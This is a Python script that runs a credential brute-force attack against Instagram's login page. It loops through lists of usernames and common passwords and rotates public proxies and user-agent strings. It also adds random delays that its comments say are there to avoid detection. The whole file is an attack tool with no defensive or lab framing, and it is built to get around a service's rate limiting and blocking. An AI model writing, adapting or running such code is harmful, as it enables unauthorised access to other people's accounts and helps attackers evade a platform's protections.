import requests
import random
import time

# Target login URL
LOGIN_URL = "https://www.instagram.com/accounts/login/#"  # Replace with actual URL

# Usernames and passwords
usernames = ["admin", "user", "test"]
passwords = ["password123", "123456", "admin123", "welcome", "qwerty"]

# List of proxies (Replace with valid ones)
proxies_list = [
    "http://31.40.248.2:8080",
    "http://44.215.100.135:8118",
    "http://184.168.124.233:5402",
]

# List of user-agents
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
]

# Function to check if a proxy is working
def test_proxy(proxy):
    try:
        test_url = "https://httpbin.org/ip"  # A simple endpoint to check IP
        response = requests.get(test_url, proxies={"http": proxy, "https": proxy}, timeout=5)
        if response.status_code == 200:
            print(f"[+] Working proxy: {proxy}")
            return True
    except requests.RequestException:
        print(f"[-] Dead proxy: {proxy}")
    return False

# Filter out only working proxies
valid_proxies = [proxy for proxy in proxies_list if test_proxy(proxy)]

if not valid_proxies:
    print("[!] No working proxies found. Exiting...")
    exit()

# Brute-force function
def brute_force_login(url, username_list, password_list, proxies, user_agents):
    for username in username_list:
        for password in password_list:
            proxy = random.choice(proxies)  # Use only working proxies
            headers = {"User-Agent": random.choice(user_agents)}

            data = {
                "username": username,  # Adjust field names based on actual form
                "password": password
            }

            try:
                response = requests.post(url, data=data, headers=headers, proxies={"http": proxy, "https": proxy}, timeout=10)

                if "Invalid" not in response.text:  # Adjust based on the site's response
                    print(f"[+] Success! Username: {username}, Password: {password}")
                    return  # Stop if successful
                else:
                    print(f"[-] Failed: Username: {username}, Password: {password}")

            except requests.RequestException as e:
                print(f"[!] Proxy error: {proxy} -> {e}")

            time.sleep(random.uniform(2, 5))  # Random delay to avoid detection

# Run brute-force attack with working proxies
brute_force_login(LOGIN_URL, usernames, passwords, valid_proxies, user_agents)
